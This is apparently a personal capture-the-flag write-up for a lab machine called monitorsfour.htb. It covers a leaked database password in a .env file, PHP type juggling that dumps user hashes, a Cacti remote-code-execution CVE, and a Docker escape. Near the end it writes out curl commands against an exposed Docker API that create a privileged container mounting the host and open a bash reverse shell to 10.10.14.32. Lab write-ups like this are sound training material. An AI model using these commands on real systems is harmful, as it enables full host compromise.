# Note
```
Port
- Web
- Wsman

Web 
- /.env -> MariaDB credential
- Changelog -> 
	SQlinjection at forgot password -> not work
	Docker Desktop 4.44.2. -> # CVE-2025-9074 -> Docker Escape
- PHP/8.3.27 -> PHP juggling Vulnerability -> User Admin -> Hash Password
- Subdomain -> Cacti -> CVE -> RCE -> User.txt
  
Shell
- Docker env
- MySQL login -> user column user -> decrypt hash
	admin -> wonderful1
	mwatson -> none
	janderson -> none
	dthompson -> none
- Docker Escape
	docker enumeration
	creater docker with backdoor
	star docker -> get shell -> no root.txt in /root -> check mount -> root.txt
  

```
# Fingerprinting
TCP
![](../../../attachments/Pasted%20image%2020260129105134.png)

UDP
![](../../../attachments/Pasted%20image%2020260128151257.png)

# Reconnaisance Version
![](../../../attachments/Pasted%20image%2020260128160240.png)

dirsearch
![](../../../attachments/Pasted%20image%2020260128161717.png)

Untitled.env
```
DB_HOST=mariadb
DB_PORT=3306
DB_NAME=monitorsfour_db
DB_USER=monitorsdbuser
DB_PASS=f37p2j8f4t0r
```
![](../../../attachments/Pasted%20image%2020260128161820.png)

login -> no error
reset password -> no error

/contact
![](../../../attachments/Pasted%20image%2020260128185154.png)

/Router.php
![](../../../attachments/Pasted%20image%2020260129093939.png)

/user
![](../../../attachments/Pasted%20image%2020260128185341.png)

ffuf
![](../../../attachments/Pasted%20image%2020260129105926.png)

cacti.monitorsfour.htb
![](../../../attachments/Pasted%20image%2020260129131723.png)

CVE
![](../../../attachments/Pasted%20image%2020260129145220.png)

# PHP Junggling Vulnerablity
The web server use PHP, lets try PHP Junggling Vulnerability on login
![](../../../attachments/Pasted%20image%2020260202073224.png)

extract data ![](../../../attachments/Pasted%20image%2020260203062601.png)

```
[{"id":2,"username":"admin","email":"admin@monitorsfour.htb","password":"56b32eb43e6f15395f6c46c1c9e1cd36","role":"super user","token":"8024b78f83f102da4f","name":"Marcus Higgins","position":"System Administrator","dob":"1978-04-26","start_date":"2021-01-12","salary":"320800.00"},{"id":5,"username":"mwatson","email":"mwatson@monitorsfour.htb","password":"69196959c16b26ef00b77d82cf6eb169","role":"user","token":"0e543210987654321","name":"Michael Watson","position":"Website Administrator","dob":"1985-02-15","start_date":"2021-05-11","salary":"75000.00"},{"id":6,"username":"janderson","email":"janderson@monitorsfour.htb","password":"2a22dcf99190c322d974c8df5ba3256b","role":"user","token":"0e999999999999999","name":"Jennifer Anderson","position":"Network Engineer","dob":"1990-07-16","start_date":"2021-06-20","salary":"68000.00"},{"id":7,"username":"dthompson","email":"dthompson@monitorsfour.htb","password":"8d4a7e7fd08555133e056d9aacb1e519","role":"user","token":"0e111111111111111","name":"David Thompson","position":"Database Manager","dob":"1982-11-23","start_date":"2022-09-15","salary":"83000.00"}]
```

we got admin credential
decrypt hash
![](../../../attachments/Pasted%20image%2020260203095524.png)

successfully login as admin
![](../../../attachments/Pasted%20image%2020260203095803.png)

there are sql injection in forgot password in v1.6
![](../../../attachments/Pasted%20image%2020260203102307.png)

![](../../../attachments/Pasted%20image%2020260203102722.png)

# CVE-2025-24367
https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC

we can login using marcus:wonderful1
![](../../../attachments/Pasted%20image%2020260203104852.png)

run the exploit get the shell
![](../../../attachments/Pasted%20image%2020260203110535.png)

get user.txt
![](../../../attachments/Pasted%20image%2020260203111210.png)

# Priveledge Escalation
in docker instance
![](../../../attachments/Pasted%20image%2020260203151226.png)

windows in outside
![](../../../attachments/Pasted%20image%2020260203153356.png)

local port
![](../../../attachments/Pasted%20image%2020260203155710.png)

access mysql, no data
![](../../../attachments/Pasted%20image%2020260204104942.png)

enumerate docker instance
![](../../../attachments/Pasted%20image%2020260204104902.png)```
```
[{"Containers":1,"Created":1762794130,"Id":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","Labels":{"com.docker.compose.project":"docker_setup","com.docker.compose.service":"nginx-php","com.docker.compose.version":"2.39.1"},"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","size":856},"RepoDigests":["docker_setup-nginx-php@sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666"],"RepoTags":["docker_setup-nginx-php:latest"],"SharedSize":-1,"Size":1277167255},{"Containers":1,"Created":1762791053,"Id":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","Labels":{"com.docker.compose.project":"docker_setup","com.docker.compose.service":"mariadb","com.docker.compose.version":"2.39.1","org.opencontainers.image.authors":"MariaDB Community","org.opencontainers.image.base.name":"docker.io/library/ubuntu:noble","org.opencontainers.image.description":"MariaDB Database for relational SQL","org.opencontainers.image.documentation":"https://hub.docker.com/_/mariadb/","org.opencontainers.image.licenses":"GPL-2.0","org.opencontainers.image.ref.name":"ubuntu","org.opencontainers.image.source":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.title":"MariaDB Database","org.opencontainers.image.url":"https://github.com/MariaDB/mariadb-docker","org.opencontainers.image.vendor":"MariaDB Community","org.opencontainers.image.version":"11.4.8"},"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40","size":856},"RepoDigests":["docker_setup-mariadb@sha256:74ffe0cfb45116e41fb302d0f680e014bf028ab2308ada6446931db8f55dfd40"],"RepoTags":["docker_setup-mariadb:latest"],"SharedSize":-1,"Size":454269972},{"Containers":0,"Created":1759921496,"Id":"sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412","Labels":null,"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412","size":9218},"RepoDigests":["alpine@sha256:4b7ce07002c69e8f3d704a9c5d6fd3053be500b7f1c69fc0d80990c2ad8dd412"],"RepoTags":["alpine:latest"],"SharedSize":-1,"Size":12794775}]

```

Create Docker Instance
```
curl -X POST http://192.168.65.7:2375/containers/create -H "Content-Type: application/json" -d '{"Image":"alpine:latest","Cmd":["sh","-c","chroot /host /bin/bash -c '\''bash -i >& /dev/tcp/10.10.14.32/4455 0>&1'\''"],"HostConfig":{"Privileged":true,"NetworkMode":"host","Binds":["/:/host"]}}'
```

Start
```
curl -X POST http://192.168.65.7:2375/containers/fdfc362fbd20f63a1695d65b9821ff8c3591e22d094adb5d5e14c78200c28990/start
```
![](../../../attachments/Pasted%20image%2020260204121320.png)

Get Shell
![](../../../attachments/Pasted%20image%2020260204121350.png)

get root.txt
![](../../../attachments/Pasted%20image%2020260204121649.png)
